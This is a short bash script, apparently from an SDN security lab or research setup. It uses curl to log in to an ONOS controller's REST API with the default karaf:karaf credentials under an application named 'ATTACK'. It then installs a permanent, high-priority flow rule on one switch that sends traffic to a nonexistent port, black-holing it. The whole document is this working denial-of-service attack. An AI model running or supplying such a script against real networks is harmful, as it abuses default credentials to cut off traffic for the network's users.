#!/bin/bash

curl -X POST --header 'Content-Type: application/json' --header 'Accept: application/json' 'http://192.168.11.102:8181/onos/v1/flows/of:5e3ec45444902a7a?appId=ATTACK' -u karaf:karaf -d '{"priority":1000, "isPermanent":true, "treatment":{"instructions":[{"type":"OUTPUT","port":999999}]}}'
